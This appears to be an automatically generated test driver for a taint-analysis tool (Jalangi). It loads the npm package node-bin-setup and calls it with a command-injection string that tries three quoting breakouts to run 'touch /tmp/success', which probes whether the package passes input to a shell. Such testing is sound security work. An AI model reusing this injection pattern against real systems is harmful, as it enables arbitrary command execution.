// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};
    
var PUT = require('/nodetaint/packageData/node-bin-setup/node_modules/node-bin-setup');
try {
	var x0 = undefined;
var x1 = " $(touch /tmp/success) # \" || touch /tmp/success # ' || touch /tmp/success";
new PUT(x0,x1)();
} catch (e) {
	console.log(e);
}